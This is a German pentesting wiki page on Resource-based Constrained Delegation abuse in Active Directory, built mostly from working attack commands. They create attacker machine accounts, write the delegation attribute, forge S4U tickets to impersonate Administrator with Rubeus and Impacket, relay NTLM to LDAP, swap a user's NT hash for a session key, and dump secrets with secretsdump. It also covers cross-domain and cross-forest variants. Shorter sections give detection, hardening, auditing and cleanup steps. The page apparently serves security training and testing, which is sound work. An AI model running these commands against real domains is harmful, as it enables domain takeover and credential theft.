# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen der Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) ähnelt der [constrained delegation](constrained-delegation.md), aber die Vertrauensrichtung ist umgekehrt. Bei der herkömmlichen constrained delegation wird festgehalten, an welche Dienste ein Principal delegieren darf; bei RBCD wird auf der **Zielressource** festgehalten, welche Principals Benutzer gegenüber dieser Ressource impersonieren dürfen.<sup>[[12]](#references)</sup>

Das Attribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ des Zielobjekts enthält einen Sicherheitsdeskriptor, der die Principals festlegt, die gegenüber dieser Ressource im Namen anderer Identitäten handeln dürfen.

Ein weiterer wichtiger Unterschied besteht darin, dass ein Principal mit ausreichenden **Schreibberechtigungen für ein Computerkonto** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` und ähnliche Rechte) möglicherweise _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ setzen kann. Die Konfiguration herkömmlicher constrained delegation erfordert normalerweise privilegierteren administrativen Zugriff.<sup>[[1]](#references)</sup>

Genauer gesagt ist das Ändern klassischer Einstellungen für constrained delegation normalerweise durch `SeEnableDelegationPrivilege` auf einem Domain Controller beschränkt. Dieses Recht besitzen typischerweise hochprivilegierte Administratoren. Bei RBCD wird die Entscheidung auf den Sicherheitsdeskriptor des Zielobjekts verlagert. Daher kann Schreibzugriff auf die entsprechende Eigenschaft des Computerobjekts ausreichen, ohne dass der Benutzer über dieses Recht verfügen muss.<sup>[[1]](#references)[[2]](#references)</sup>

### Neue Konzepte

Das Flag **`TrustedToAuthForDelegation`** in `userAccountControl` wird oft als Voraussetzung für **S4U2Self** beschrieben, doch das ist unvollständig.\
Ein Service Principal mit einem SPN kann S4U2Self auch ohne dieses Flag anfordern. Mit `TrustedToAuthForDelegation` ist das zurückgegebene Service Ticket **forwardable**; ohne das Flag ist das Ticket normalerweise **non-forwardable**.<sup>[[5]](#references)</sup>

Herkömmliche constrained delegation lehnt im Schritt S4U2Proxy ein **non-forwardable TGS** ab. RBCD kann dieses S4U2Self-Ticket akzeptieren, wenn der Sicherheitsdeskriptor des Ziels den anfragenden Dienst autorisiert.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Angriffsablauf

> Wenn du **schreibäquivalente Berechtigungen** für ein **Computerkonto** hast, kannst du möglicherweise privilegierten Zugriff auf diesen Computer erlangen.

Angenommen, der Angreifer verfügt bereits über **schreibäquivalente Berechtigungen für das Computerobjekt des Opfers**.

1. Der Angreifer **kompromittiert** ein Konto mit einem **SPN** oder **erstellt eines** („Service A“). Standardmäßig kann ein authentifizierter Domänenbenutzer bis zu 10 Computerobjekte erstellen, wie durch **_MachineAccountQuota_** festgelegt; ein Computerobjekt stellt automatisch verwendbare SPNs bereit.
2. Der Angreifer **missbraucht seine WRITE-Berechtigung** für den Computer des Opfers (ServiceB), um **resource-based constrained delegation so zu konfigurieren, dass ServiceA jeden Benutzer gegenüber diesem Computer des Opfers (ServiceB) impersonieren darf**.
3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A zu Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
   1. S4U2Self (vom kompromittierten oder erstellten SPN-Konto): ein **TGS anfordern, der Administrator gegenüber Service A repräsentiert** (non-forwardable).
   2. S4U2Proxy: diesen **non-forwardable TGS** verwenden, um ein Service Ticket anzufordern, das **Administrator** gegenüber dem **Computer des Opfers** repräsentiert.
   3. Das non-forwardable Ticket kann in diesem RBCD-Ablauf trotzdem funktionieren, weil Service A im Sicherheitsdeskriptor der Zielressource autorisiert ist.
4. Der Angreifer kann **pass-the-ticket** verwenden und den Benutzer **impersonieren**, um **Zugriff auf den ServiceB des Opfers** zu erlangen.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` unterbindet den standardmäßigen Weg über die Erstellung von Computerkonten, entfernt aber weder Schreibberechtigungen für das Zielcomputerobjekt noch die Kontrolle über ein bestehendes Konto. Ein kontrollierter gewöhnlicher Benutzer ohne SPN kann manchmal über die [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd) als delegierender Principal verwendet werden, auch innerhalb einer Domäne. Dieser Weg setzt weiterhin ein wirksames RBCD-Schreibrecht, die Kontrolle über die Anmeldedaten des delegierenden Benutzers, eine delegierbare impersonierte Identität, kompatibles Kerberos-Verschlüsselungsverhalten sowie eine Änderung des NT-Hashes voraus, die das Konto beeinträchtigt. Behandle dies als separate Voraussetzungen; ein leeres RBCD-Attribut oder eine Null-Quote allein beweist weder, dass der Angriff gelingt, noch dass das System sicher ist.

Ein vorhandener RBCD-Deskriptor kann auch eine **Gruppe** statt direkt des delegierenden Computers enthalten. Wenn du ein Computerkonto mit SPN kontrollierst und es dieser Gruppe hinzufügen kannst, kann die neue Mitgliedschaft den Delegationspfad ermöglichen, ohne das RBCD-Attribut des Zielcomputers zu ändern. Prüfe die effektive ACL für das Ändern der Gruppenmitgliedschaft (einschließlich deny ACEs), verschachtelte Mitgliedschaften und die Aktualisierung des Tokens, die Trustee-SID im Deskriptor, Delegierungseinschränkungen des impersonierten Kontos sowie den SPN des Zieldienstes, bevor du zu dem Schluss kommst, dass der Pfad funktioniert.

Um den _**MachineAccountQuota**_ der Domäne zu überprüfen, kannst du Folgendes verwenden:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Angriff

### Erstellen eines Computerobjekts

Du kannst mit **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> ein Computerobjekt in der Domäne erstellen.

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurieren der ressourcenbasierten eingeschränkten Delegierung

**Mit dem Active Directory PowerShell-Modul**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Powerview verwenden**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Durchführung eines vollständigen S4U-Angriffs (Windows/Rubeus)

Zunächst haben wir das neue Computer-Objekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Dadurch werden die RC4- und AES-Hashes für dieses Konto ausgegeben.\
Nun kann der Angriff durchgeführt werden:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Du kannst weitere Tickets für zusätzliche Dienste generieren, indem du Rubeus einmal mit dem Parameter `/altservice` aufrufst:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Benutzer können als **„Konto ist vertraulich und kann nicht delegiert werden.“** markiert werden. Wenn dieses Flag aktiviert ist, kann das Konto über diesen Delegierungsablauf nicht impersoniert werden. BloodHound zeigt diese Eigenschaft bei der Analyse an.

### Linux-Tools: Durchgängiges RBCD mit Impacket (2024+)

Wenn du von Linux aus arbeitest, kannst du die vollständige RBCD-Kette mit den offiziellen Impacket-Tools ausführen:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Hinweise
- Wenn LDAP signing/LDAPS erzwungen wird, verwende `impacket-rbcd -use-ldaps ...`.
- Bevorzuge AES-Schlüssel; viele moderne Domänen schränken RC4 ein. Impacket und Rubeus unterstützen beide AES-only-Abläufe.
- Impacket kann für einige Tools den `sname` („AnySPN“) umschreiben, aber rufe nach Möglichkeit den korrekten SPN ab (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Domänenübergreifendes und forestübergreifendes RBCD

Wenn der **delegierende Prinzipal**, den du kontrollierst, in einer **anderen Domäne** (oder sogar einem **anderen Forest**) als der **Ressourcencomputer** lebt, handelt es sich weiterhin um **RBCD**, aber der Ticket-Ablauf entspricht nicht mehr dem üblichen `S4U2Self -> S4U2Proxy` innerhalb einer einzelnen Domäne.

### Domänenübergreifendes RBCD: den fremden Prinzipal anhand der SID konfigurieren

Wenn du `msDS-AllowedToActOnBehalfOfOtherIdentity` aus einer **anderen Domäne** festlegst, ist der fremde Computer/die fremde Person im LDAP der Zieldomäne möglicherweise **nicht anhand des Namens auflösbar**. Konfiguriere in diesem Fall den Delegierungseintrag anhand der **SID** des fremden Prinzipals statt anhand seines sAMAccountName/UPN.

Dies ist besonders relevant, wenn NTLM an LDAP mit `ntlmrelayx.py` weitergeleitet wird:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Hinweise:
- `--sid` weist `ntlmrelayx.py` an, `--escalate-user` als SID zu behandeln. Das ist erforderlich, wenn das delegierende Konto nicht zur Zieldomäne gehört.
- Selbst wenn das Tool `User not found in LDAP` ausgibt, kann das Schreiben der Delegierung trotzdem erfolgreich sein, da der Security Descriptor die fremde SID direkt speichert.

### Domänenübergreifendes RBCD: Cross-Realm-S4U-Sequenz

Sobald der fremde Principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` eingetragen ist, funktioniert der domänenübergreifende Ablauf wie folgt:<sup>[[9]](#references)[[13]](#references)</sup>

1. Ein **TGT** für den delegierenden Principal aus dessen eigener Domäne abrufen.
2. Ein **Referral-TGT** für `krbtgt/<target-domain>` anfordern.
3. Auf dem DC der Zieldomäne ein **Cross-Realm-S4U2Self-Referral** für den zu imitierenden Benutzer anfordern.
4. Das eigentliche **S4U2Self**-Ticket für diesen Benutzer zurück in der Domäne des Delegators anfordern.
5. **S4U2Proxy** in der Domäne des Delegators ausführen, um ein Referral-Ticket für die Zieldomäne zu erhalten.
6. Das abschließende **S4U2Proxy** auf dem DC der Zieldomäne ausführen, um das Service-Ticket für `cifs/host.target`, `host/host.target` usw. zu erhalten.

Deshalb schlägt standardmäßiges Linux-Tooling für domänenübergreifendes RBCD oft fehl:<sup>[[9]](#references)</sup>
- Das **Realm** der Anfrage muss sich möglicherweise von dem Realm des TGT unterscheiden, das in der `TGS-REQ` verwendet wird.
- Die Kette benötigt **unabhängige S4U2Proxy-Schritte**, nicht nur `S4U2Self` oder `S4U2Self`, unmittelbar gefolgt von einem einzelnen `S4U2Proxy`.

### Domänenübergreifendes RBCD unter Linux

Synacktiv veröffentlichte eine Impacket-Implementierung von `getST.py`, die die Cross-Realm-Sequenz unter Linux nachbildet, indem sie die beiden KDCs explizit behandelt:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operativ lauten die neuen Argumente:
- `-dc-ip`: DC der **delegierenden** Domain
- `-targetdomain`: Domain des **Ressourcencomputers**
- `-targetdc`: DC der **Ressourcen**-Domain

### Einschränkungen bei Cross-Forest-RBCD

Cross-Forest-RBCD hat eine wichtige Einschränkung: **Der impersonierte Benutzer muss derselben Forest angehören wie der delegierende Principal**. Mit anderen Worten: Wenn sich dein kontrolliertes Maschinenkonto in `valhalla.local` befindet und die Zielressource in `asgard.local`, kannst du über RBCD in der Regel **keine beliebigen `asgard.local`-Benutzer** gegenüber dieser Ressource impersonieren.<sup>[[9]](#references)</sup>

Ein Exploit ist weiterhin möglich, wenn:
- der Benutzer im **delegierenden Forest** auf dem Ressourcenhost im anderen Forest **lokaler Administrator** (oder anderweitig privilegiert) ist
- ein Trust den erforderlichen Authentifizierungspfad ermöglicht und die fremde SID im Sicherheitsdeskriptor des Zielcomputers akzeptiert wird

### Eigenheiten des Cross-Forest-RBCD-Protokolls

Cross-Forest-RBCD ist nicht einfach „Cross-Domain plus ein Trust“. Der beobachtete Ablauf umfasst zwei Eigenheiten, die gängige Tools bisher oft nicht berücksichtigen:<sup>[[9]](#references)</sup>

1. Eine zusätzliche **S4U2Proxy**-Anfrage, die **`PA-PAC-OPTIONS=branch-aware`** setzt
2. Ein abschließendes Service-Ticket, das möglicherweise mit **RC4** zurückgegeben wird, selbst wenn andere Etypes angefordert wurden

Der praktische Ablauf ist:

1. Ein TGT für den delegierenden Principal in Forest A abrufen.
2. **S4U2Self** für den impersonierten Benutzer in Forest A anfordern.
3. **S4U2Proxy** in Forest A anfordern, um ein Referral-TGT für Forest B zu erhalten.
4. Eine zweite **S4U2Proxy**-Anfrage in Forest A senden, **ohne** das S4U2Self-Ticket als zusätzliches Ticket, aber mit aktiviertem `branch-aware`, um ein weiteres Referral-TGT für Forest B zu erhalten.
5. Optional ein normales Service-Ticket in Forest B für den delegierenden Principal anfordern (dieses Ticket ist für den abschließenden Missbrauch nicht erforderlich).
6. Die Referral-Tickets aus Schritt 3 und 4 verwenden, um das abschließende **S4U2Proxy**-Ticket in Forest B für den impersonierten Benutzer aus Forest A zum Ziel-SPN anzufordern.

### Cross-Forest-RBCD unter Linux

Derselbe Synacktiv-Impacket-Branch ergänzt für diese Logik einen `-forest`-Schalter:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Rekursives Multi-Domain-RBCD (3+ Domains)

In **Multi-Domain-Forests** können sowohl **S4U2Self** als auch **S4U2Proxy** **rekursiv** sein, anstatt nach einer Referral weiterzumachen:

- **Rekursives S4U2Self**: Das erste `S4U2Self` wird an die **Domain des impersonierten Users** gesendet. Dazwischenliegende Parent-/Child-Hops werden mit normalen `TGS-REQ`-Referrals für `krbtgt/<REALM>` durchlaufen, und das **letzte `S4U2Self`** wird in der eigenen Domain des **delegierenden Principals** gesendet.
- Das bedeutet, dass es **ausreichen kann, nur ein TGT** für einen Maschinenaccount zu besitzen, um einen **Admin aus einer anderen Domain im selben Forest** zu impersonieren und `cifs/host`, `host/host`, `wsman/host` usw. anzufordern.
- **Rekursives S4U2Proxy** folgt der Trust-Kette auf dieselbe Weise: Bei dazwischenliegenden Hops wird das vorherige Ticket als TGT wiederverwendet, während das nächste `krbtgt/<REALM>`-Referral angefordert wird. Nur der letzte Hop gibt das finale Service-Ticket zurück.<sup>[[10]](#references)</sup>

Ein praktisches Beispiel innerhalb desselben Forests ist:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-loses domainübergreifendes / forestübergreifendes RBCD

Wenn der **delegierende Principal ein Benutzer ohne SPN ist**, schlägt das letzte rekursive `S4U2Self` mit **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** fehl. Als Workaround wird **nur der letzte Schritt erneut als `S4U2Self+U2U` ausgeführt**.<sup>[[10]](#references)</sup>

Kurzfassung der Abuse-Kette:

1. Mit dem **NT-Hash** authentifizieren, damit der KDC bevorzugt **RC4-HMAC (etype 23)** verwendet.
2. Zuerst **`-self -u2u`** anfordern und dieses Ticket getrennt vom späteren Proxy-Schritt aufbewahren.
3. Den **TGT-Sitzungsschlüssel** mit `describeTicket.py` extrahieren.
4. Den **NT-Hash** des Benutzers mit `changepasswd.py -newhashes <session_key>` durch diesen **Sitzungsschlüssel** ersetzen.
5. Das `S4U2Self+U2U`-Ticket bei einer separaten **`-proxy`**-Anfrage als **`-additional-ticket`** wiederverwenden.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Betriebshinweise:

- Wenn der **erste vertrauenswürdige Hop bereits eine andere Forest ist**, sollte der **branch-aware** Algorithmus (`getST.py ... -forest`) verwendet werden, um das native Verhalten von Windows nachzubilden. Wird die fremde Forest erst **später** in der Kette erreicht, kann der nicht branch-aware rekursive Ablauf weiterhin funktionieren.<sup>[[9]](#references)</sup>
- Auf aktuellen **Windows Server 2022/2025**-DCs kann erzwungenes RC4 aufgrund der Abkündigung von RC4 mit **`KDC_ERR_ETYPE_NOSUPP`** fehlschlagen. Dadurch kann **SPN-less RBCD unmöglich** sein, obwohl klassisches SPN-basiertes RBCD mit AES weiterhin funktioniert.<sup>[[15]](#references)</sup>
- Führe **`S4U2Self+U2U` aus, bevor du den Hash/das Passwort des Benutzers änderst**: `SamrChangePasswordUser` berechnet die Kerberos-AES-Schlüssel des Kontos **nicht** neu. Eine vorherige Passwortänderung kann daher spätere Ticketanfragen beeinträchtigen.<sup>[[14]](#references)</sup>
- Das impersonierte Konto muss weiterhin **delegierbar** sein: **Protected Users** und Konten mit **`NOT_DELEGATED`** / **„Konto ist vertraulich und kann nicht delegiert werden“** verhindern die Kette.

## Erkennungs- / Härtungshinweise

- RBCD-Pfade über Domänen/Forests hinweg werden weiterhin meist durch **ACL-Missbrauch** oder **Relay-to-LDAP** eingerichtet. Erzwinge **LDAP signing** und **LDAP channel binding** auf DCs, um gängige Einrichtungspfade zu unterbinden.
- Prüfe, wer `msDS-AllowedToActOnBehalfOfOtherIdentity` für Computerobjekte ändern kann, und löse die gespeicherten SIDs auf, einschließlich **foreign security principals**.
- Prüfe in Umgebungen mit vielen Trusts **Selective Authentication**, **SID filtering** und ob Benutzer aus einer fremden Forest über **local admin**-Rechte auf Ressourcenhosts verfügen.

### Zugriff

Die letzte Befehlszeile führt den **vollständigen S4U-Angriff aus und injiziert den TGS** von Administrator zum Opferhost in den **Arbeitsspeicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst von Administrator angefordert, sodass du auf **C$** zugreifen kannst:

```bash
ls \\victim.domain.local\C$
```

### Verschiedene Service-Tickets missbrauchen

Mehr über die [**hier verfügbaren Service-Tickets**](silver-ticket.md#available-services).

## Auflisten, Auditierung und Bereinigung

### Computer mit konfiguriertem RBCD auflisten

PowerShell (SD decodieren, um SIDs aufzulösen):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (mit einem Befehl auslesen oder leeren):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du nur den RC4-Hash angibst. Übergib Rubeus mindestens den AES256-Hash (oder einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** bei `-self` für einen normalen Benutzer: Der delegierende Principal hat wahrscheinlich **keinen SPN**. Versuche den **letzten Hop** erneut mit **`S4U2Self+U2U`** statt mit einem regulären `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** bei **SPN-less RBCD**: Neuere DCs können den erzwungenen **RC4-HMAC**-Pfad ablehnen, den der Trick mit `S4U2Self+U2U` und Session-Key-Substitution erfordert. Versuche stattdessen einen klassischen **SPN-backed**-RBCD-Pfad mit AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und Kerberos daher nicht richtig funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername und die Hashes für die Anmeldung nicht funktionieren. Vielleicht hast du vergessen, beim Erzeugen der Hashes das „$“ in den Benutzernamen einzufügen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Das kann Folgendes bedeuten:
  - Der Benutzer, den du impersonieren möchtest, kann nicht auf den gewünschten Dienst zugreifen (weil du ihn nicht impersonieren kannst oder weil er nicht über ausreichende Berechtigungen verfügt).
  - Der angeforderte Dienst existiert nicht (wenn du ein Ticket für WinRM anforderst, WinRM aber nicht läuft).
  - Der erstellte Fakecomputer hat seine Berechtigungen auf dem anfälligen Server verloren, und du musst sie ihm zurückgeben.
  - Du missbrauchst klassisches KCD; denke daran, dass RBCD mit nicht weiterleitbaren S4U2Self-Tickets funktioniert, während KCD weiterleitbare Tickets erfordert.

## Hinweise, Relays und Alternativen

- Du kannst den RBCD SD auch über AD Web Services (ADWS) schreiben, wenn LDAP gefiltert wird. Siehe:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig mit RBCD, um in einem Schritt lokale SYSTEM-Rechte zu erlangen. Siehe praktische End-to-End-Beispiele:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Wenn LDAP signing/channel binding **deaktiviert** sind und du ein Computerkonto erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP weiterleiten, `msDS-AllowedToActOnBehalfOfOtherIdentity` für dein Computerkonto am Zielcomputerobjekt setzen und dich anschließend sofort per S4U von einem externen Host aus als **Administrator** impersonieren.<sup>[[8]](#references)</sup>

## References

- [1] [Dem Hund den Schwanz wedeln lassen: Missbrauch von Resource-Based Constrained Delegation für Angriffe auf Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Noch ein Wort zur Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Übernahme von Computerobjekten](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Missbrauch von Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity tötete die Domäne: Ein Überblick über offensives Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (offiziell)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Kurzer Linux-Spickzettel mit aktueller Syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing deaktiviert → Kerberos-Relay zu RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv – Untersuchung von domänen- und forestübergreifendem RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv – Untersuchung von domänen- und forestübergreifendem RBCD: Teil 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv-Impacket-Branch – cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn – Übersicht über Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications – Domänenübergreifendes S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications – SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn – Erkennen und Beheben der RC4-Verwendung in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Details zu S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
